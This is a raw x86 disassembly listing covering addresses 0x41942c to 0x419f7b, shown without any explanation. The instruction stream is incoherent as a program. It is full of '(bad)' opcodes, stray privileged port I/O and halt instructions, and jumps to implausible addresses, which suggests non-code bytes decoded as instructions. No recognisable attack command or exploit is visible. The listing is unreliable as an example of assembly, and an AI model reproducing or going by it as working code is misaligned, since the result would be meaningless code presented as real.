  41942c:	xor    al,0xd5
  41942e:	push   esi
  41942f:	es jbe 0x41946f
  419432:	or     DWORD PTR gs:[edx-0x24],edx
  419436:	pop    ecx
  419437:	hlt    
  419438:	cmp    eax,esp
  41943a:	shr    DWORD PTR [ecx],1
  41943c:	xor    DWORD PTR [eax+0x5a31c2f3],ebx
	...
  4194b2:	add    BYTE PTR [eax],al
  4194b4:	inc    ecx
  4194b5:	stc    
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	rdtsc  
  4194c2:	repnz cmp BYTE PTR [esi-0x9fffeee],dh
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [edx-0x38ce5c53],ch
  4194d1:	cmp    esp,DWORD PTR [ebp-0x3a]
  4194d4:	mov    ebx,0xf5c88be6
  4194d9:	sar    DWORD PTR [esi-0x6a382622],cl
  4194df:	mov    esp,DWORD PTR [edx-0x7957a389]
  4194e5:	enter  0x2e14,0x8a
  4194e9:	inc    ecx
  4194ea:	hlt    
  4194eb:	int3   
  4194ec:	push   cs
  4194ed:	dec    edi
  4194ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194ef:	retf   0xeaac
  4194f2:	mov    ebx,0xd0a8bb7b
  4194f7:	xor    bl,cl
  4194f9:	xchg   esp,eax
  4194fa:	in     eax,0x42
  4194fc:	sub    eax,0xf0480fc2
  419501:	int    0x1b
  419503:	(bad)  
  419504:	jnp    0x419572
  419506:	outs   dx,DWORD PTR ds:[esi]
  419507:	inc    edi
  419508:	push   esp
  419509:	cwde   
  41950a:	hlt    
  41950b:	mov    al,0x24
  41950d:	stc    
  41950e:	adc    cl,bh
  419510:	jnp    0x419584
  419512:	pop    esp
  419513:	imul   eax,ecx,0x483f5544
  419519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41951a:	xchg   ebx,eax
  41951b:	mov    edi,0xa3203eb6
  419520:	ins    DWORD PTR es:[edi],dx
  419521:	mov    ecx,0x538ccf53
  419526:	push   0xffffffd1
  419528:	(bad)  
  419529:	in     al,dx
  41952a:	jge    0x419508
  41952c:	repz rcr DWORD PTR [ebx],cl
  41952f:	addr16 mov ecx,0x619cc3e2
  419535:	mov    WORD PTR cs:[ebx],fs
  419538:	fisubr WORD PTR [ecx-0x7ef66339]
  41953e:	jmp    0x49ca315f
  419543:	daa    
  419544:	mov    eax,ds:0x33845a89
  419549:	cld    
  41954a:	mov    dl,0x98
  41954c:	mov    ds:0xdec03034,al
  419551:	ret    0xbb97
  419554:	mov    ss,WORD PTR [eax+edx*1-0x3c]
  419558:	add    eax,0x395a7e69
  41955d:	nop
  41955e:	fst    DWORD PTR [ecx+0xd568344]
  419564:	dec    edx
  419565:	imul   edi,DWORD PTR [esi],0x60
  419568:	int3   
  419569:	cdq    
  41956a:	popa   
  41956b:	cmp    ch,BYTE PTR [edi+0xc]
  41956e:	data16 ror ah,0x8e
  419572:	push   ebp
  419573:	call   0x904f38a3
  419578:	(bad)  
  419579:	js     0x4195c0
  41957b:	push   esp
  41957c:	jo     0x419519
  41957e:	dec    esp
  41957f:	sahf   
  419580:	and    al,0x72
  419582:	imul   ebx,edx,0xffffffb0
  419585:	arpl   WORD PTR [edx+eax*2+0x1c],ax
  419589:	outs   dx,DWORD PTR ds:[esi]
  41958a:	and    dh,al
  41958c:	xor    eax,0x4f6d8158
  419591:	cmp    DWORD PTR [ebx],ebx
  419593:	inc    edx
  419594:	les    eax,FWORD PTR [esi+0x2d]
  419597:	jl     0x4195aa
  419599:	adc    DWORD PTR [eax],ebx
  41959b:	out    dx,eax
  41959c:	push   ds
  41959d:	inc    esp
  41959e:	cs das 
  4195a0:	dec    edx
  4195a1:	loope  0x4195e0
  4195a3:	jg     0x419604
  4195a5:	xchg   ebp,eax
  4195a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195a7:	dec    ecx
  4195a8:	mov    WORD PTR [edx+0x6dde2d61],es
  4195ae:	push   eax
  4195af:	out    0xa5,al
  4195b1:	pop    ebp
  4195b2:	loopne 0x4195e5
  4195b4:	jo     0x4195b7
  4195b6:	test   eax,0x4e201b28
  4195bb:	or     bl,BYTE PTR [ebp-0x40]
  4195be:	and    ecx,DWORD PTR [ebx+0xd1c]
	...
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0x73f55ee]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [edi],dl
  41964d:	inc    edi
  41964e:	lahf   
  41964f:	push   ds
  419650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419651:	fsub   st(1),st
  419653:	rol    DWORD PTR [ebx],1
  419655:	sub    BYTE PTR [eax-0x27],bl
  419658:	mov    ds:0xf4811082,eax
  41965d:	pop    esi
  41965e:	or     bh,BYTE PTR [ebx+0x1c]
  419661:	xchg   edx,eax
  419662:	imul   ebx,DWORD PTR [esi-0x202bbf79],0x32035808
  41966c:	dec    esp
  41966d:	cdq    
  41966e:	pop    edx
  41966f:	inc    ebx
  419670:	or     dl,0xbd
  419673:	jmp    0x41963f
  419675:	stos   BYTE PTR es:[edi],al
  419676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419677:	dec    edx
  419678:	frstor ds:0x37469d81
  41967e:	retf   
  41967f:	fdiv   st(4),st
  419681:	pop    ebp
  419682:	aas    
  419683:	xlat   BYTE PTR ds:[ebx]
  419684:	and    al,0x90
  419686:	push   esi
  419687:	not    DWORD PTR [ebp+0x2e]
  41968a:	mov    esi,0x192d2fd
  41968f:	test   eax,0x59fcf039
  419694:	out    dx,al
  419695:	shr    DWORD PTR [ecx],0x66
  419698:	dec    esi
  419699:	and    DWORD PTR [ecx+0x26],edx
  41969c:	or     esi,DWORD PTR [esi-0x25]
  41969f:	retf   0x59f
  4196a2:	mov    ebp,0x1576b074
  4196a7:	jae    0x4196e5
  4196a9:	mov    ecx,0x98d176f9
  4196ae:	inc    esp
  4196af:	mov    ds:0x3bbce9cc,eax
  4196b4:	clc    
  4196b5:	add    dh,al
  4196b7:	jnp    0x4196c4
  4196b9:	adc    edi,ebx
  4196bb:	and    al,0x66
  4196bd:	adc    eax,0x3a5c8631
  4196c2:	mov    esp,0x700a7191
  4196c7:	add    bh,BYTE PTR [edx]
  4196c9:	int    0x34
  4196cb:	inc    esp
  4196cc:	mov    esp,0xd39bfa3a
  4196d1:	out    dx,al
  4196d2:	add    eax,0x55fd1a3d
  4196d7:	pop    ebp
  4196d8:	gs sub eax,0x161b7a75
  4196de:	and    edx,DWORD PTR [ebx+0x152f39c8]
  4196e4:	loopne 0x41973d
  4196e6:	mov    esi,0xb8e5e29c
  4196eb:	gs je  0x4196d2
  4196ee:	or     dh,BYTE PTR [ebp+0x3c55e2ce]
  4196f4:	int    0xc7
  4196f6:	int    0xa2
  4196f8:	iret   
  4196f9:	xchg   esi,eax
  4196fa:	or     DWORD PTR [eax-0x7c5a0862],edx
  419700:	mov    bh,BYTE PTR [edi]
  419702:	scas   eax,DWORD PTR es:[edi]
  419703:	pop    ss
  419704:	push   ss
  419705:	sahf   
  419706:	pop    es
  419707:	cmp    al,0x50
  419709:	cmp    eax,0x68f3b482
  41970e:	inc    edi
  41970f:	cmc    
  419710:	int    0xca
  419712:	aaa    
  419713:	popf   
  419714:	stos   BYTE PTR es:[edi],al
  419715:	ja     0x41974b
  419717:	push   es
  419718:	in     al,0x4d
  41971a:	aam    0xf2
  41971c:	dec    edi
  41971d:	and    al,0x5d
  41971f:	cmp    bh,BYTE PTR ss:[ebx]
  419722:	mov    ah,0xac
  419724:	sbb    BYTE PTR [ecx-0xb],al
  419727:	test   bl,ah
  419729:	push   cs
  41972a:	push   ds
  41972b:	stos   DWORD PTR es:[edi],eax
  41972c:	arpl   WORD PTR [ecx+0x3d],dx
  41972f:	mov    al,ds:0x9409342f
  419734:	in     eax,dx
  419735:	loope  0x4196d3
  419737:	call   FWORD PTR [edx]
  419739:	out    0x4b,eax
  41973b:	arpl   WORD PTR [esi+0x67b3ae4f],bp
  419741:	out    0x0,al
	...
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx-0x4fd83417]
  4197c1:	mov    ebp,0x14a21f70
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	test   BYTE PTR [eax],0x0
  4197cb:	add    BYTE PTR [esi-0x57a48303],ch
  4197d1:	test   DWORD PTR [edi+0x3f],0x4c93f1ba
  4197d8:	lea    edi,[ebx]
  4197da:	xchg   ebp,eax
  4197db:	sbb    dl,dh
  4197dd:	fidiv  DWORD PTR [esi+0x2f031997]
  4197e3:	pop    ebp
  4197e4:	pop    esp
  4197e5:	fcmove st,st(7)
  4197e7:	jle    0x419834
  4197e9:	ficomp DWORD PTR [ebx-0x1e2758b2]
  4197ef:	aad    0xa1
  4197f1:	lds    edx,FWORD PTR [edi+0x5a0868bf]
  4197f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f8:	lock and DWORD PTR [ebp+0x34a706f2],ecx
  4197ff:	(bad)  
  419800:	jle    0x4197fb
  419802:	repz adc ebp,DWORD PTR [edx+0x56]
  419806:	push   edx
  419807:	sub    esi,ebp
  419809:	or     al,0xe6
  41980b:	sub    ch,BYTE PTR [eax+0x31]
  41980e:	repz inc esi
  419810:	sbb    al,0x1e
  419812:	cmp    eax,0x786d82a1
  419817:	inc    DWORD PTR [ebx-0x2d]
  41981a:	gs sub al,0x32
  41981d:	jno    0x419855
  41981f:	jns    0x41989e
  419821:	jl     0x419842
  419823:	fldenv [esi+esi*2+0xd]
  419827:	pop    ss
  419828:	scas   eax,DWORD PTR es:[edi]
  419829:	sbb    DWORD PTR ds:0xb52965ee,0x49
  419830:	pop    ss
  419831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419832:	sub    eax,0xa7fc4fd8
  419837:	xchg   dl,dh
  419839:	(bad)  
  41983a:	mov    WORD PTR [esp+eiz*4+0x13],ss
  41983e:	lods   al,BYTE PTR ds:[esi]
  41983f:	stos   DWORD PTR es:[edi],eax
  419840:	fild   DWORD PTR [edx+0x5a099a62]
  419846:	lea    edx,[ebx-0x72]
  419849:	(bad)  
  41984a:	fneni(8087 only) 
  41984c:	ret    0x7528
  41984f:	inc    edi
  419850:	push   ebp
  419851:	jbe    0x41984c
  419853:	ins    BYTE PTR es:[edi],dx
  419854:	xor    ah,dh
  419856:	mov    eax,ds:0x8621ed84
  41985c:	test   DWORD PTR es:[ebp+edx*1+0x4f],esi
  419861:	dec    edi
  419862:	cwde   
  419863:	cmp    esp,DWORD PTR [edi+0x31139ece]
  419869:	dec    esi
  41986a:	push   edi
  41986b:	retf   0xbea3
  41986e:	or     esi,DWORD PTR [esi+0x3ef4dccc]
  419874:	repz loop 0x419885
  419877:	sbb    eax,0xe3b8fcbd
  41987c:	(bad)  
  41987d:	hlt    
  41987e:	cwde   
  41987f:	hlt    
  419880:	mov    ecx,0x528c438c
  419885:	lods   al,BYTE PTR ds:[esi]
  419886:	mov    al,0x3f
  419888:	fucomi st,st(0)
  41988a:	js     0x4198cc
  41988c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41988d:	jecxz  0x4198fd
  41988f:	dec    esp
  419890:	popf   
  419891:	adc    eax,0xb157f61f
  419896:	mov    ds:0xe6ceb04,eax
  41989b:	sar    DWORD PTR [ebp-0x68],0x86
  41989f:	es ds lock call 0xf320cd9b
  4198a7:	lahf   
  4198a8:	and    ecx,DWORD PTR [esi-0x5d35c67c]
  4198ae:	iret   
  4198af:	pop    es
  4198b0:	retf   
  4198b1:	imul   DWORD PTR [esi-0x78ed9f1a]
  4198b7:	mov    edi,0xcc8f9786
  4198bc:	xlat   BYTE PTR ds:[ebx]
  4198bd:	sub    bl,BYTE PTR [ecx-0x5f]
  4198c0:	pop    esp
  4198c1:	enter  0x0,0x0
	...
  419931:	add    BYTE PTR [eax],al
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	mov    dl,0x52
  419942:	cmp    ebx,DWORD PTR [ebp-0x68]
  419945:	adc    eax,0xf60001
  41994a:	add    BYTE PTR [eax],al
  41994c:	and    eax,0x3f335056
  419951:	jbe    0x4198d5
  419953:	xor    DWORD PTR es:[edi-0x12],0xfd089411
  41995b:	xor    BYTE PTR [ebx+edx*1+0x2c],ch
  41995f:	adc    edi,ecx
  419961:	retf   
  419962:	jb     0x419958
  419964:	mov    ecx,0x7b39a8ba
  419969:	mov    eax,0xea8eb64
  41996e:	out    dx,eax
  41996f:	sub    al,0xfa
  419971:	int3   
  419972:	jecxz  0x4199e5
  419974:	push   edi
  419975:	pop    esi
  419976:	and    dl,BYTE PTR [ecx-0x132a42b0]
  41997c:	push   0x3536ac3c
  419981:	xor    ch,BYTE PTR [ecx-0x7c]
  419984:	iret   
  419985:	std    
  419986:	mov    esi,0x63f350ed
  41998b:	jmp    0x41993e
  41998d:	sbb    eax,0x2be0ae6f
  419992:	es jns 0x4199fd
  419995:	out    0xcd,al
  419997:	ret    
  419998:	mov    edi,0xfa658b3c
  41999d:	dec    ebp
  41999e:	dec    ebx
  41999f:	dec    edx
  4199a0:	jmp    0x419a1b
  4199a2:	fsub   st,st(4)
  4199a4:	inc    esi
  4199a5:	gs cmp esp,edx
  4199a8:	mov    eax,DWORD PTR [edx+0x239b4b3e]
  4199ae:	and    DWORD PTR [edx],eax
  4199b0:	repnz dec ebx
  4199b2:	fdiv   QWORD PTR fs:[ecx-0x36ecc74]
  4199b9:	imul   edx,DWORD PTR ds:0xc67b5954,0x32
  4199c0:	aad    0xfc
  4199c2:	pop    ebx
  4199c3:	dec    edx
  4199c4:	xor    BYTE PTR [ecx+0x75920e88],cl
  4199ca:	test   DWORD PTR [ecx*1-0x1e32c3d9],ebx
  4199d1:	and    al,0x5a
  4199d3:	and    dl,BYTE PTR [edi+eiz*8-0x54c9fc77]
  4199da:	inc    ecx
  4199db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199dc:	pop    ss
  4199dd:	push   ebp
  4199de:	out    dx,eax
  4199df:	inc    DWORD PTR [edx+0x143e4c16]
  4199e5:	adc    BYTE PTR [edx+0x7],dh
  4199e8:	fcomip st,st(4)
  4199ea:	dec    BYTE PTR [ebx-0x52]
  4199ed:	add    eax,0xfd1b09c0
  4199f2:	mov    bh,0x0
  4199f4:	mov    esp,0xc568958e
  4199f9:	bound  edi,QWORD PTR [ecx]
  4199fb:	cmp    al,0x82
  4199fd:	push   ss
  4199fe:	adc    al,0x22
  419a00:	add    ch,BYTE PTR [esi]
  419a02:	div    BYTE PTR [ebx+0xd]
  419a05:	(bad)  
  419a06:	(bad)  
  419a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a08:	fwait
  419a09:	jmp    0x28f2b9bb
  419a0e:	push   es
  419a0f:	fcom   DWORD PTR [esi]
  419a11:	or     ebx,DWORD PTR [ebx-0x6d2c1bdf]
  419a17:	add    dh,BYTE PTR [eax]
  419a19:	stc    
  419a1a:	pop    es
  419a1b:	adc    eax,0x70a928ac
  419a20:	test   BYTE PTR [ecx+edx*8+0x4b338431],bl
  419a27:	inc    ebx
  419a28:	add    esp,DWORD PTR [ebx+0x36]
  419a2b:	in     eax,0x77
  419a2d:	jns    0x419aa5
  419a2f:	mov    al,dl
  419a31:	pop    ebp
  419a32:	sub    eax,0x872567f6
  419a37:	int    0xdf
  419a39:	lea    ebp,ds:0x1bc7eb1d
  419a3f:	xor    eax,0xff30
	...
  419ab4:	jl     0x419ac9
  419ab6:	test   DWORD PTR [edx],esi
  419ab8:	out    dx,eax
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x99357b47
  419ac1:	aas    
  419ac2:	xchg   DWORD PTR [ebx-0x72],eax
  419ac5:	push   ss
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	test   BYTE PTR [eax],0x0
  419acb:	add    dh,bh
  419acd:	inc    ecx
  419ace:	dec    esi
  419acf:	mov    esp,0xf9707c38
  419ad4:	cld    
  419ad5:	in     al,0xde
  419ad7:	xor    al,0x87
  419ad9:	aaa    
  419ada:	out    0xfd,al
  419adc:	nop
  419add:	iret   
  419ade:	xor    dh,BYTE PTR [edx+0x1a]
  419ae1:	xchg   edi,eax
  419ae2:	mov    ds:0xfd32e8f7,eax
  419ae7:	stos   DWORD PTR es:[edi],eax
  419ae8:	wbinvd 
  419aea:	jp     0x419acc
  419aec:	or     eax,0xd644ce98
  419af1:	test   DWORD PTR [ebx],0x2e6b055
  419af7:	ja     0x419af2
  419af9:	test   eax,0xe29d5e96
  419afe:	(bad)  
  419aff:	sub    al,0x1
  419b01:	sbb    DWORD PTR [esi+ebx*4-0x72189fd0],ebx
  419b08:	push   ecx
  419b09:	out    0x45,eax
  419b0b:	sub    al,0x3e
  419b0d:	mov    cs,WORD PTR [ebx+0x1867feb1]
  419b13:	aam    0xed
  419b15:	pop    esp
  419b16:	pusha  
  419b17:	dec    edx
  419b18:	xor    al,0xc7
  419b1a:	int3   
  419b1b:	pop    ebx
  419b1c:	mov    edx,0x3cfb71b7
  419b21:	adc    ecx,0xffffff93
  419b24:	and    DWORD PTR [ecx+eiz*4-0x5a],0xcafb56cc
  419b2c:	dec    ebx
  419b2d:	hlt    
  419b2e:	pop    esp
  419b2f:	sbb    ebp,DWORD PTR [eax+0x5b]
  419b32:	arpl   bp,ax
  419b34:	and    BYTE PTR [ecx-0x4b],ch
  419b37:	xor    eax,DWORD PTR [edx*8-0x1d4e7780]
  419b3e:	jp     0x419aed
  419b40:	cmp    edi,DWORD PTR [edi+0x431aaa5b]
  419b46:	sub    DWORD PTR fs:[ecx+0x4d],eax
  419b4a:	xor    DWORD PTR [ecx+0x651f9a7b],eax
  419b50:	lods   eax,DWORD PTR ds:[esi]
  419b51:	cld    
  419b52:	xchg   edx,eax
  419b53:	(bad)  
  419b54:	loopne 0x419ba6
  419b56:	push   ss
  419b57:	ret    0xc59d
  419b5a:	jae    0x419b8e
  419b5c:	xor    al,dl
  419b5e:	jle    0x419aeb
  419b60:	cmp    BYTE PTR [esi-0x2c],dh
  419b63:	xchg   DWORD PTR [edi+edx*2-0x7a],ebp
  419b67:	cmp    ah,BYTE PTR [edi-0x61]
  419b6a:	pop    edi
  419b6b:	adc    dl,BYTE PTR [edi+0x7f07d106]
  419b71:	pop    esi
  419b72:	inc    esp
  419b73:	jmp    0xdd1:0xd61a9971
  419b7a:	cmp    al,0x31
  419b7c:	cli    
  419b7d:	and    al,0xc9
  419b7f:	js     0x419c00
  419b81:	outs   dx,DWORD PTR ds:[esi]
  419b82:	or     BYTE PTR [esi+0x3e1721a],ch
  419b88:	add    BYTE PTR [edx+0x9],0xf0
  419b8c:	loope  0x419b90
  419b8e:	stos   DWORD PTR es:[edi],eax
  419b8f:	cmc    
  419b90:	push   cs
  419b91:	xor    al,bh
  419b93:	dec    esi
  419b94:	cmp    DWORD PTR es:0x84d47c30,edx
  419b9b:	pop    es
  419b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b9d:	xor    al,0xb3
  419b9f:	push   edx
  419ba0:	inc    ebx
  419ba1:	jge    0x419b9b
  419ba3:	xor    esp,DWORD PTR [ecx]
  419ba5:	inc    edx
  419ba6:	jl     0x419ba4
  419ba8:	mov    gs,WORD PTR [edx+edi*4+0x22]
  419bac:	jnp    0x419c0a
  419bae:	stos   DWORD PTR es:[edi],eax
  419baf:	daa    
  419bb0:	lods   eax,DWORD PTR ds:[esi]
  419bb1:	loop   0x419be4
  419bb3:	pmaddwd mm1,mm3
  419bb6:	mov    bh,0xa7
  419bb8:	mov    dh,dl
  419bba:	jnp    0x419c03
  419bbc:	das    
  419bbd:	lock jle 0x419c3a
  419bc0:	jns    0x419b4e
	...
  419c32:	add    BYTE PTR [eax],al
  419c34:	sti    
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0x17
  419c41:	lods   al,BYTE PTR ds:[esi]
  419c42:	xchg   edi,eax
  419c43:	test   BYTE PTR fs:[edi],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	test   BYTE PTR [eax],0x0
  419c4b:	add    BYTE PTR [ebp+0xeb1deda],bl
  419c51:	or     eax,0x2fc193b1
  419c56:	push   eax
  419c57:	mov    ah,0x51
  419c59:	sbb    dl,BYTE PTR [ebx+0x13]
  419c5c:	mov    edx,0x1c419323
  419c61:	jno    0x419c45
  419c63:	scas   eax,DWORD PTR es:[edi]
  419c64:	adc    BYTE PTR [edi],ch
  419c66:	xchg   edx,eax
  419c67:	pop    edi
  419c68:	and    al,0x9a
  419c6a:	int3   
  419c6b:	cmp    DWORD PTR ds:[ecx-0x38],esi
  419c6f:	std    
  419c70:	in     al,dx
  419c71:	adc    BYTE PTR [ebp-0x6353cda1],bh
  419c77:	sti    
  419c78:	sub    al,0xc
  419c7a:	jns    0x419cc5
  419c7c:	imul   eax,DWORD PTR [esp+ebp*4-0x5387de33],0x25
  419c84:	dec    esp
  419c85:	stos   BYTE PTR es:[edi],al
  419c86:	mov    edx,DWORD PTR [edx+0x4f89d12b]
  419c8c:	sbb    eax,0xcb048ed2
  419c91:	cwde   
  419c92:	pop    edx
  419c93:	add    dh,ah
  419c95:	mov    eax,0xd7fca81f
  419c9a:	sahf   
  419c9b:	xchg   edx,eax
  419c9c:	inc    esp
  419c9d:	xor    edi,edi
  419c9f:	xchg   esi,eax
  419ca0:	push   cs
  419ca1:	outs   dx,DWORD PTR ds:[esi]
  419ca2:	jge    0x419d17
  419ca4:	dec    edx
  419ca5:	mov    ebx,0x1f44ccfc
  419caa:	dec    esp
  419cab:	ficomp WORD PTR [edi+0x77897a88]
  419cb1:	push   esp
  419cb2:	cli    
  419cb3:	pop    edx
  419cb4:	rcl    esi,cl
  419cb6:	push   eax
  419cb7:	dec    ecx
  419cb8:	ret    
  419cb9:	inc    esi
  419cba:	sbb    esi,ebp
  419cbc:	leave  
  419cbd:	arpl   si,dx
  419cbf:	hlt    
  419cc0:	inc    ecx
  419cc1:	push   eax
  419cc2:	rol    DWORD PTR fs:[ebx-0x14],0xf3
  419cc7:	sti    
  419cc8:	mov    dh,ch
  419cca:	jo     0x419ca9
  419ccc:	sbb    bl,BYTE PTR ds:0x9395609b
  419cd2:	inc    ebp
  419cd3:	mov    WORD PTR [ebp+0x13fddb1b],ss
  419cd9:	ret    
  419cda:	push   es
  419cdb:	scas   eax,DWORD PTR es:[edi]
  419cdc:	inc    esp
  419cdd:	cmp    al,0x58
  419cdf:	ins    DWORD PTR es:[edi],dx
  419ce0:	push   0x5a
  419ce2:	es int3 
  419ce4:	lahf   
  419ce5:	dec    esp
  419ce6:	push   ebp
  419ce7:	ficomp DWORD PTR [ecx]
  419ce9:	fs sbb eax,0x3dadf98a
  419cef:	retf   0x62ee
  419cf2:	inc    edx
  419cf3:	dec    esi
  419cf4:	add    edi,esi
  419cf6:	adc    cl,BYTE PTR [eax-0x67f807be]
  419cfc:	dec    eax
  419cfd:	adc    edx,DWORD PTR [ecx+0x3a09ddc5]
  419d03:	js     0x419d44
  419d05:	gs jbe 0x419cdc
  419d08:	mov    esi,0x6e71175c
  419d0d:	sbb    eax,0xa63b8f57
  419d12:	cwde   
  419d13:	inc    ecx
  419d14:	mov    esp,0x4cc06547
  419d19:	retf   0x1d18
  419d1c:	out    0x7a,eax
  419d1e:	xor    BYTE PTR [ecx-0x1e53ef13],ah
  419d24:	push   edx
  419d25:	out    dx,eax
  419d26:	sar    BYTE PTR [eax],1
  419d28:	pop    ds
  419d29:	pop    ebx
  419d2a:	jo     0x419d96
  419d2c:	loope  0x419d7c
  419d2e:	test   edx,0xd00a0599
  419d34:	dec    ecx
  419d35:	out    dx,eax
  419d36:	sbb    bl,BYTE PTR [esi]
  419d38:	dec    eax
  419d39:	dec    esp
  419d3a:	mov    ah,0xc9
  419d3c:	(bad)  
  419d3d:	rol    bh,1
  419d3f:	daa    
  419d40:	pop    ecx
  419d41:	leave  
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	ffreep st(2)
  419dc2:	cmp    eax,0x1187a4f
  419dc7:	add    dh,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    ah,dh
  419dcd:	or     BYTE PTR [edi],ah
  419dcf:	or     ch,bl
  419dd1:	call   0x500f7b29
  419dd6:	dec    ebp
  419dd7:	bound  ebp,QWORD PTR [edi]
  419dd9:	mov    edx,0xd5dc871f
  419dde:	sbb    al,0xa
  419de0:	(bad)  
  419de1:	out    0x51,eax
  419de3:	xor    DWORD PTR [esi+0x61],esp
  419de6:	xlat   BYTE PTR ds:[ebx]
  419de7:	rcr    dl,1
  419de9:	in     al,0x58
  419deb:	cmp    DWORD PTR [edx+0x127de4a8],0x611da5c8
  419df5:	ret    
  419df6:	sbb    bh,0x45
  419df9:	in     al,dx
  419dfa:	mov    es,ebx
  419dfc:	popa   
  419dfd:	add    ebp,DWORD PTR [ecx+0x6c792c9a]
  419e03:	adc    ch,BYTE PTR [ebp+0x3349245f]
  419e09:	shl    DWORD PTR [ebx],0x87
  419e0c:	inc    edx
  419e0d:	and    BYTE PTR [edx],ah
  419e0f:	fcomp  DWORD PTR [esi+0x6eba131e]
  419e15:	aaa    
  419e16:	mov    ah,0xb0
  419e18:	sbb    BYTE PTR [ebp-0x95b18a2],cl
  419e1e:	jne    0x419e03
  419e20:	scas   al,BYTE PTR es:[edi]
  419e21:	inc    ebp
  419e22:	sub    eax,DWORD PTR [esi]
  419e24:	pop    esp
  419e25:	pop    es
  419e26:	sbb    dh,bl
  419e28:	pusha  
  419e29:	mov    ecx,0x1131a2a9
  419e2e:	sub    al,0xbf
  419e30:	scas   al,BYTE PTR es:[edi]
  419e31:	jmp    0x3361b264
  419e36:	jnp    0x419e52
  419e38:	push   es
  419e39:	lea    edx,[eax]
  419e3b:	cmp    eax,0xde25f47
  419e40:	xor    eax,0xe18c1e9f
  419e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e47:	inc    ecx
  419e48:	frstor [ebp-0x39aed2b7]
  419e4e:	inc    esi
  419e4f:	jge    0x419e60
  419e51:	and    esp,DWORD PTR ds:0xfdd42a53
  419e57:	shr    BYTE PTR [ebp+esi*8+0x4],1
  419e5b:	adc    eax,0xd8cbf08
  419e60:	cmp    BYTE PTR [edx+0x5f],0x9d
  419e64:	loopne 0x419e81
  419e66:	or     DWORD PTR [edi],esi
  419e68:	push   ebp
  419e69:	fmul   QWORD PTR [edi-0x55beb426]
  419e6f:	out    dx,eax
  419e70:	pop    esi
  419e71:	jne    0x419e9b
  419e73:	jns    0x419e98
  419e75:	xor    eax,0xc
  419e78:	mov    cl,0x33
  419e7a:	mov    es,WORD PTR [ebp-0x71fff30e]
  419e80:	js     0x419ebc
  419e82:	iret   
  419e83:	and    bl,BYTE PTR [edx]
  419e85:	mov    ch,0xfd
  419e87:	es mov al,0xc7
  419e8a:	jmp    0x5a57:0xece2b992
  419e91:	xchg   dl,cl
  419e93:	or     bh,BYTE PTR [ecx-0x716401bf]
  419e99:	adc    bl,bl
  419e9b:	dec    esp
  419e9c:	sbb    al,0x30
  419e9e:	addr16 and ebx,ebx
  419ea1:	mov    ds:0x26e861f3,eax
  419ea6:	addr16 dec esi
  419ea8:	xchg   edi,eax
  419ea9:	ret    0x251
  419eac:	imul   eax,DWORD PTR [ecx-0x704ee198],0xffffffa8
  419eb3:	inc    ebx
  419eb4:	jns    0x419e69
  419eb6:	mov    bh,0xc6
  419eb8:	inc    ebx
  419eb9:	jecxz  0x419f06
  419ebb:	lds    edx,FWORD PTR [ecx-0x6d528cb0]
  419ec1:	jmp    0x419ec3
	...
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x1761f4b7]
  419f41:	mov    cl,0x6b
  419f43:	pop    ebp
  419f44:	jo     0x419f5f
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    cl,al
  419f4d:	adc    eax,0xea6efbd
  419f52:	pop    ds
  419f53:	lock cmp BYTE PTR [ecx],bh
  419f56:	pushf  
  419f57:	sbb    edx,ebp
  419f59:	jns    0x419f04
  419f5b:	jnp    0x419fc5
  419f5d:	cli    
  419f5e:	cmp    eax,0x9ffc67a2
  419f63:	xlat   BYTE PTR ds:[ebx]
  419f64:	push   0xffffffdf
  419f66:	fxtract 
  419f68:	push   ds
  419f69:	scas   al,BYTE PTR es:[edi]
  419f6a:	push   edx
  419f6b:	jbe    0x419f77
  419f6d:	xchg   esi,eax
  419f6e:	stos   BYTE PTR es:[edi],al
  419f6f:	test   al,0x7f
  419f71:	mov    ecx,0x522b6166
  419f76:	push   0xd901c292
  419f7b:	xor    eax,0xd7abe0ec
